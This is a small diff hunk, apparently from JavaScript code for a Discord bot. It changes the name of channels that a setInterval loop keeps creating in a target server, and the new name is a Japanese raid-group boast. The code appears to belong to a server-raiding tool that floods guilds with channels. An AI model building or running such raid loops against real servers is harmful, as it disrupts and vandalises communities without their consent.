@@ -77,7 +77,7 @@ client.on("messageCreate", async (message) => {
     }
     var qwer = setInterval(function() {
       client.guilds.cache.get(g).channels.create({
-        name: `TheAARR`,
+        name: `荒らし連合軍最強!`,
         type: 0,
         parent: null
       }).then((ch) => {
